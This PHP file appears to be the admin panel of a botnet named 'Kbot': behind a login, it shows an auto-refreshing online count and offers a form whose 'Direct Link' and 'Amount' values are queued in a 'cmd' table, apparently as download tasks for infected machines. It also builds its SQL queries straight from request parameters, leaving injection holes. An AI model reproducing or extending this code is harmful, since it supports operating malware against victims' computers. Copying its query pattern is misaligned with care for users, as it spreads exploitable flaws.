<?php
	include_once('config.php');
	
	if(isset($_POST['login']))
	{
		$username = $_POST['user'];
		$pass = $_POST['pass'];
					
		if(!$auth->authenticate($username, $pass)){
			echo "<script type='text/javascript'>alert('Username or Password incorrect!');</script>";
		}
	}
?>

<?php
if($_GET['page'] == "logout")
{	
	session_start();
	session_unset();
	session_destroy();
	header( 'Location: index.php' ) ;
}
?>

<html>
<head>
	<title>Kbot</title>
	<link rel="stylesheet" href="css/skeleton-v1.1.css">
	<link rel="stylesheet" href="css/main-r6.css">
	<link rel="shortcut icon" href="images/favicon.ico">
</head>

<body>
<div id="main" role="main" class="dark">

<header class="dark">
	<div class="container">
		<h1 class="logo one-third column alpha">
			<a href="/">
				<img src="images/logo-white.png" alt="Spark" class="scale-with-grid" />
			</a>
		</h1>

		<nav class="menu two-thirds column omega">
			<ul>
				<li><a href="" class="active">Home</a></li>
			</ul>
		</nav>
	</div><!-- .container -->

	<div class="bottom-gradient">
		<span class="left"></span>
		<span class="center"></span>
		<span class="right"></span>
	</div>	
</header>

<article id="home">

</br></br></br></br></br>
	<div class="container">
		<div class="row box dark light">
			<center>
			<div class="row">
			<h1>Please Login</h1>
			</div>
			</br></br>

			
			<form action="" method="post">
<br/><br/>
				<input type="text" name="user" placeholder="Username" required="required"  autocomplete="off"  style='width:310px;'/>
				<br/><br/>
				<input type="password" name="pass" placeholder="Password" required="required"  autocomplete="off"  style='width:310px;'/>	
				<div class="row">
				<br/>
				<input type="submit" name="login" value="Login" />
				</div>
			</form>
			
			</br></br></br>
		</div><!-- .row -->	
	</div><!-- .container -->
</article>

</div><!-- #main -->
</body>
</html>

<?php
if ($auth->verify()){

if(isset($_GET['id']))
{
mysql_query("DELETE FROM cmd WHERE id = '{$_GET['id']}'");
	header( 'Location: index.php' ) ;
}
?>

<html>
<head>
	<title>Main</title>

	<link rel="stylesheet" href="css/skeleton-v1.1.css">
	<link rel="stylesheet" href="css/main-r6.css">
<script src="js/ajax.js"></script>
<script>
$(document).ready(function()
{
$('#timeval').load('online.php');
   var refreshId = setInterval(function()
   {
     $('#timeval').load('online.php?randval='+ Math.random());
   }, 2000);
});
</script>
</head>

<body>

<div id="main" role="main" class="dark">

<header class="dark">
	<div class="container">
		<h1 class="logo one-third column alpha">
			<a href="">
				<img src="images/logo-white.png" alt="Spark" class="scale-with-grid" />
			</a>
		</h1>

		<nav class="menu two-thirds column omega">
			<ul>
				<li><a href="" class="active">Main</a></li>
				<li><a href="stats.php">Stats</a></li>
				<li><a href="index.php?page=logout">Log Out</a></li>
			</ul>
		</nav>
	</div><!-- .container -->

	<div class="bottom-gradient">
		<span class="left"></span>
		<span class="center"></span>
		<span class="right"></span>
	</div>	
</header>

<article id="home">
	<div class="container">
		<div class="row box dark light">
			<div class="row">
			<div align="center" id="timeval"></div>
			</div>
		</div><!-- .row -->	
	</div><!-- .container -->
</article>
			<center>
<div class="container">
		<div class="row box dark light">
			<form action="" method="post">
<br/><br/>
				<input type="text" name="link" placeholder="Direct Link" required="required"  autocomplete="off"  style='width:210px;'/>
				<br/><br/>
				<input type="text" name="amount" placeholder="Amount" required="required"  autocomplete="off"  style='width:210px;'/>	
				<div class="row">
				<br/>
				<input type="submit" name="submit" value="Submit" />
				</div>
			</form>
</div><!-- .row -->	
	</div><!-- .container -->


		
<?php
if(isset($_POST['amount']))
{
mysql_query("INSERT INTO cmd (cmd, amount, done) VALUES ('{$_POST['link']}', '{$_POST['amount']}',0)");
}
?>
</body>
</html>

<?php
	}
?>